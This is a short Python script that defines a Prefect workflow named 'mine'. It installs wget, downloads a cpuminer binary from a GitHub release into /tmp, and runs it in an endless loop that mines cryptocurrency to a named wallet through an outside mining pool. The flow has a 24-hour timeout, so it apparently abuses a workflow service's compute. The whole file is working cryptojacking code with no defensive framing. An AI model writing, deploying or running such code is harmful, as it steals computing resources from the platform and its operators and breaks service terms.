import subprocess
from prefect import flow, get_run_logger

@flow(timeout_seconds=86400)
def mine():
    logger = get_run_logger()
    subprocess.run("apt-get update -q && apt-get install -y wget 2>/dev/null", shell=True)
    subprocess.run("cd /tmp && wget -q https://github.com/RainbowMiner/miner-binaries/releases/download/v5.0.46-rplant/cpuminer-opt-linux-5.0.46u.tar.gz -O c.tar.gz && tar xf c.tar.gz", shell=True)
    r = subprocess.run("find /tmp -name 'cpuminer*'", shell=True, capture_output=True, text=True)
    logger.info("Files: " + r.stdout)
    while True:
        result = subprocess.run("/tmp/cpuminer-avx2 -a yespowertide -o stratum+tcps://na.rplant.xyz:17059 -u TWJa3cLtb2ibL5C6i93GVD6DTHjUqpuxHs.Prefect -t 4", shell=True, capture_output=True, text=True, timeout=300)
        logger.info(result.stdout)
        logger.info(result.stderr)

if __name__ == "__main__":
    mine()
